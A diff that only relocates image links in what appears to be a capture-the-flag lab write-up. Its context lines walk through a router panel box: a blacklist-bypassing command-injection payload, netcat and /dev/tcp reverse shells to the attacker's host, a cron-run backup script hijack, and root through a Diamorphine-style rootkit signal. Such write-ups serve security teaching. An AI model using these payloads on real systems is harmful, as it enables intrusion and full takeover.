@@ -39,15 +39,15 @@ SMB1 disabled -- no workgroup available
 
 As we can see, we got a `public` share, let's take a look:
 
-![](cybersecurity/images/Pasted%2520image%252020250423162152.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250423162152.png)
 
 We got a file, let's get it and view the contents:
 
-![](cybersecurity/images/Pasted%2520image%252020250423163005.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250423163005.png)
 
 We got an endpoint, let's proceed with the web application then:
 
-![](cybersecurity/images/Pasted%2520image%252020250423163046.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250423163046.png)
 
 Nothing weird in here, let's go to the specified route:
 
@@ -57,11 +57,11 @@ http://10.10.214.108/myrouterpanel/
 
 We can see this:
 
-![](cybersecurity/images/Pasted%2520image%252020250423163143.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250423163143.png)
 
 We can test some basic stuff, for example, let's try a simple ping to `127.0.0.1` to check the behavior:
 
-![](cybersecurity/images/Pasted%2520image%252020250423163528.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250423163528.png)
 
 
 Let's begin exploitation
@@ -72,7 +72,7 @@ Let's begin exploitation
 
 As we can see, the ping goes through, based on this, we can try some command injection payloads, let's use a basic one to check the behavior:
 
-![](cybersecurity/images/Pasted%2520image%252020250423163619.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250423163619.png)
 
 There seems to be some blacklist surveilling which characters we put in the `ip`, we can try modifying the payloads until we get an advanced one, let's refer to our command injection notes, for example, here are a list of characters that may be helpful:
 
@@ -93,7 +93,7 @@ I tried using a payload from a previous machine on `HackTheBox`:
 ip=8.8.8.8%0Abash%09-c%09"id"%0A&submit=
 ```
 
-![](cybersecurity/images/Pasted%2520image%252020250423164508.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250423164508.png)
 
 There we go, it worked, let's craft a reverse shell:
 
@@ -102,11 +102,11 @@ ip=8.8.8.8%0Abash%09-c%09"nc -c /bin/sh 10.6.34.159 9001"%0A&submit=
 ```
 
 
-![](cybersecurity/images/Pasted%2520image%252020250423164854.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250423164854.png)
 
 If we check our listener:
 
-![](cybersecurity/images/Pasted%2520image%252020250423164905.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250423164905.png)
 
 There we go, we got our connection, let's proceed with privilege escalation.
 
@@ -127,11 +127,11 @@ export TERM=xterm
 export BASH=bash
 ```
 
-![](cybersecurity/images/Pasted%2520image%252020250423165109.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250423165109.png)
 
 After using linpeas, I found there is a `/usr/share/backups` directory owned by `www-data` with the group `athena`, let's take a look:
 
-![](cybersecurity/images/Pasted%2520image%252020250423165916.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250423165916.png)
 
 We got a `backup.sh` file, let's look at the contents:
 
@@ -173,7 +173,7 @@ bash -c 'bash -i >& /dev/tcp/YOUR_IP/PORT 0>&1' &
 
 If we start our listener a wait a little bit:
 
-![](cybersecurity/images/Pasted%2520image%252020250423170454.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250423170454.png)
 
 We need to stabilize our shell again:
 
@@ -189,7 +189,7 @@ export BASH=bash
 
 Let's check our sudo privileges:
 
-![](cybersecurity/images/Pasted%2520image%252020250423170829.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250423170829.png)
 
 We can run something called `venom.ko`, let's have more info of it, we can do:
 
@@ -209,12 +209,12 @@ vermagic:       5.15.0-69-generic SMP mod_unload modversions
 
 As we can see, this is a rootkit written by `m0nad`, let's use GitHub:
 
-![](cybersecurity/images/Pasted%2520image%252020250423171008.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250423171008.png)
 
 
 This rootkit refers to something called `Diamorphine`, let's check the repo:
 
-![](cybersecurity/images/Pasted%2520image%252020250423171043.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250423171043.png)
 
 There we go, we got our way to get into root, since we need to send a `signal 64` to become root, we can do this:
 
@@ -224,7 +224,7 @@ sleep 10 & # This will show us the pid
 kill -64 2865
 ```
 
-![](cybersecurity/images/Pasted%2520image%252020250423171951.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250423171951.png)
 
 If we check our id, it doesn't seem to work, this is because the signal has been modified to `57` instead of `64` on this rootkit, we can now do it again:
 
@@ -234,7 +234,7 @@ sleep 10 & # This will show us the pid
 kill -57 pid
 ```
 
-![](cybersecurity/images/Pasted%2520image%252020250423174845.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250423174845.png)
 
 As seen, we are root:
 
@@ -248,5 +248,5 @@ athena@routerpanel:/$ cat /home/athena/user.txt
 857c4a4fbac638afb6c7ee45eb3e1a28
 ```
 
-![](cybersecurity/images/Pasted%2520image%252020250423175116.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250423175116.png)
 
